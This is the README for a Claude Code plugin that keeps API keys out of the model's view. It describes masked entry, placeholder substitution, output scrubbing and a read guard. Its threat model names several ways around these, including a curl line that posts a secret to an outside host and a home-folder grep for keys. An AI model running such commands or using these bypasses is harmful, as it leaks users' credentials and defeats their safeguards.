# bws-secrets

A secret box for Claude Code. When Claude needs an API key, token or password, it calls `request_secret`. A pane
opens with a masked entry; you type the value there, not in the chat. It is saved outside the project, and Claude only
ever sees a placeholder, `{{secret:NAME}}`. A Bash command that uses the placeholder gets the real value at execution
time, and the command's output is scrubbed before Claude Code stores it. The value never reaches the transcript or the
model.

## Load

    claude --plugin-dir ./bws-secrets

## What it adds

| What | How |
|---|---|
| Tool `mcp__bws-secrets__request_secret` (`name`, `purpose`) | Opens the **Secret** pane: click the box, type the value (one dot per character), press Enter. The value goes to `<secretsDir>/<project>.env`. The tool result is only `saved as NAME; use {{secret:NAME}}`. **Keep the saved value** reuses an earlier one; **Cancel** saves nothing. |
| `{{secret:NAME}}` in a Bash command | The command is rewritten so the shell reads `NAME` from the file and exports it, and the placeholder becomes `${NAME}`. The rewritten text holds the file path, never the value. |
| Output scrub | Every Bash result (stdout, stderr, an error text, a large output the engine kept in a file) has each saved value replaced by `{{secret:NAME}}`, in raw form and as JSON-escaped, base64, base64url, percent-encoded and hex text. |
| Read guard | Read, Grep, Glob and Bash calls that would read the secrets folder are refused with a note that tells Claude to use the placeholder. |
| `/secrets` | Lists the saved names for this project, never the values. `/secrets remove NAME` deletes one. |
| Summary atom | `{ plugin: 'bws-secrets', key: 'summary' }`: `secrets N` with N names saved, `secret: asking for NAME` while the pane waits, nothing with none. bws-cockpit draws it as a chip. |

A name is an upper-case letter followed by upper-case letters, digits or `_` (at most 64), and not a shell variable
such as `PATH` or `HOME`. A value is one line of 4 to 8,192 characters.

## Options

| Option | Default | Meaning |
|---|---|---|
| `secretsDir` | empty: `~/.claude/bws-secrets` | Folder for the saved values. Each working directory gets its own file, named the way Claude Code names its project folders (`C--Projects-app.env`). Keep it outside your projects. |

No model is called, so there are no model options.

## How it works

The design and its evidence are in `runs/2026-10-13-mods-m8-secrets/DECISIONS.md`. In short:

- A `tool.call` rewrite of a Bash command reaches the shell, but Claude Code records only the command Claude wrote. A
  spike with four ways of passing the value showed this. The rewrite reads the value from the file in the shell
  (`export NAME="$(sed -n 's/^NAME=//p' '<file>' ...)"`), so the value never passes through Claude Code. It does not
  appear in the rewritten command, the permission prompt or the shell's command line.
- The scrub runs in the same `tool.call` hook after the command. It returns a new result, so the scrubbed copy is what
  is stored, both the text Claude reads and the structured record in the transcript file. A `session.append` rewrite
  alone would leave the structured record unscrubbed.
- The scrub fails closed. If it cannot run after the command ran, the result is withheld.
- `request_secret` waits for you inside its hook. A hook may take only 10 s of its own time, but the clock stops while
  a call to Claude Code is in flight. So the hook waits by running a one-second sleeper process (`ping -n 2 127.0.0.1`
  on Windows, `sleep 1` elsewhere) until you answer, the turn is interrupted, or 10 minutes pass.
- The masked entry is a `Client` surface module (`hooks/entry.ts`). It keeps what you type in its own state, draws
  dots, and posts the value once, on Enter, to this plugin alone. A plain `Input` would draw your typing.

## Threat model

It protects against the value reaching the model, the transcript file, the stream (`-p`, the SDK) and
`$.session.messages()` when a Bash command uses `{{secret:NAME}}`. It also keeps Claude from reading the secrets file
with Read, Grep, Glob or a Bash command that names the folder.

It does **not** protect against:

- **A command that sends the value somewhere.** `curl -d "{{secret:TOKEN}}" https://elsewhere` runs as written. The
  shell runs what Claude wrote, so review commands that use a placeholder as you would any other.
- **A file the value is written to, or a file you point Claude at.** For example `echo "{{secret:TOKEN}}" > out.txt`
  and then Read `out.txt`, or a `.env` file in the project. Only Bash output is scrubbed, not other tools' results.
- **A value transformed into a form the scrub does not know**: reversed, split, encrypted, or encoded in a way the
  scrub does not list.
- **Other ways into the folder**: PowerShell or another shell tool, an MCP server, a subagent's own process, a
  recursive search of a parent folder in Bash (`grep -r KEY ~`), or a path built at run time.
- **A command run in the background.** A placeholder command with `run_in_background` is refused, because its later
  output would not pass through the scrub.
- **Anyone with access to your user account.** The file is plain text (dotenv) in your home folder. Claude Code mods
  cannot set file permissions; restrict the folder yourself if you need to.
- **Other mods.** Mods are not sandboxed. Another plugin can read the file or watch this one's events.

## Capabilities used

`tool.register` and `tool.call` (its own tool, plus Read, Grep, Glob and Bash), `command.register` and `command.run`
(`/secrets`), `ui.open`/`ui.close`/`ui.render` (one pane), `ui.message` (the entry's post), a `Client` surface
module, `fs.read`/`fs.write` (the secrets file and a large output's file), `process.run` (the sleeper),
`session.cwd`/`session.surfaces`, `env.get` (`HOME`, `USERPROFILE`, `OS`), `clock.now`, `state` (the `entry` and
`summary` atoms). No network calls, no model calls.

## Tested

Claude Code 2.1.296 on Windows 11 (Git Bash as the Bash tool's shell).

- Static: `claude plugin validate ./bws-secrets` passes.
- Automated: `claude plugin test` in `bws-secrets/` (53 tests: the rewrite, the scrub, the guard with a false-positive
  corpus, request_secret with the pane and the masked entry, `/secrets`, the summary atom). The Bash rule was also
  replayed over 64,110 real commands, with none refused.
- Live, headless (`claude -p`): the spike probes and the acceptance probe in `runs/2026-10-13-mods-m8-secrets/receipts/`
  show no value in the stream or the transcript file.
- **Untested:** the pane and the masked entry in a real terminal or the desktop app, including whether a click
  gives the entry the keyboard. The permission prompt's text for a rewritten command is also untested. Both are in
  `runs/2026-10-13-mods-m8-secrets/MANUAL-CHECKS.md`. Mobile and VS Code have no `Client`, so `request_secret` treats
  them as headless: a saved name is reused and an unsaved one is refused.
